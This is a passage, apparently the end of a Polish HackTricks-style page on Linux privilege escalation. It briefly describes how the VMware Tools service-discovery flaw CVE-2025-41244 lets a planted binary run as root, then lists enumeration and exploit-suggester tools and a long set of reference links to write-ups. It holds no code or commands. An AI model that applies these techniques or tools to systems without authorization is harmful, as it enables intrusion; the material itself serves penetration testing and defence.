../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Wykrywanie usług VMware Tools LPE (CWE-426) za pomocą exec opartego na regex (CVE-2025-41244)

Wykrywanie usług oparte na regex w VMware Tools/Aria Operations może wyodrębnić ścieżkę binarną z wierszy poleceń procesów i uruchomić ten plik z argumentem -v w uprzywilejowanym kontekście. Zbyt liberalne wzorce (np. używające \S) mogą dopasować listenery umieszczone przez atakującego w zapisywalnych lokalizacjach (np. /tmp/httpd), co prowadzi do uruchomienia jako root (CWE-426: niezaufana ścieżka wyszukiwania).<sup>[[27]](#references)</sup>

Więcej informacji i uogólniony wzorzec, który można zastosować w innych stosach wykrywania i monitorowania, znajdziesz tutaj:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Zabezpieczenia jądra

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Więcej pomocy

[Binarne pliki impacket bez zależności](https://github.com/ropnop/impacket_static_binaries)

## Narzędzia Privesc dla Linux/Unix

### **Najlepsze narzędzie do wyszukiwania wektorów lokalnej eskalacji uprawnień w Linuksie:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(opcja -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumeruje luki w jądrze Linuksa i MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (dostęp fizyczny):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Zbiór dodatkowych skryptów**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (eskalacja uprawnień przez interfejs Crontab UI, ponowne użycie danych uwierzytelniających zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: podrobiony payload .text_sig dla monitora uruchamianego przez cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: obejście Neighborhood Watch (przejęcie PATH przez sudo env_keep)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Podstawowa eskalacja uprawnień w Linuksie](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Przewodnik po eskalacji uprawnień w Linuksie](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Atak i obrona: techniki eskalacji uprawnień w Linuksie z 2016 roku](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Nikt nie spodziewa się wykonania polecenia!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (eskalacja uprawnień w Linuksie)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – omówienie ćwiczeń laboratoryjnych - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: wskazówki i triki dotyczące eskalacji uprawnień w Linuksie](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: narzędzie do enumeracji i eskalacji uprawnień w Linuksie](https://github.com/rtcrowley/linux-private-i)
- [14] [Czym jest socket?](https://www.linux.com/news/what-socket/)
- [15] [Opis rozwiązania Peppo (Proving Grounds)](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Poznaj D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [Eskalacja uprawnień w Linuksie przez pliki wykonywalne SUID](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo, część 2 – eskalacja uprawnień w Linuksie](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Jak zarządzać ACL w Linuksie](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [root w Redhat/CentOS przez network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [Czym jest systemd?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (wstrzyknięcie arytmetyczne Bash przez logi, pełny łańcuch)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [Podręcznik GNU Bash – BASH_ENV (plik startowy dla trybu nieinteraktywnego)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + eskalacja uprawnień przez dowiązanie symboliczne TF_VAR)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (kopiowanie przez cron pg_basebackup → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Nazwij to, a VMware podniesie uprawnienia (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: eskalacja uprawnień przez Sudo Chroot](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – luki w Sudo CVE-2025-32462 i CVE-2025-32463 umożliwiające eskalację uprawnień](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – katalogi repozytorium PYC](https://peps.python.org/pep-3147/)
- [32] [Dokumentacja Python importlib](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Wpis @paragonsec na Twitterze](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com – rejestrowanie haseł w Linuksie](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at – szczegóły wyścigu w logrotate](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
{{#include ../../../banners/hacktricks-training.md}}
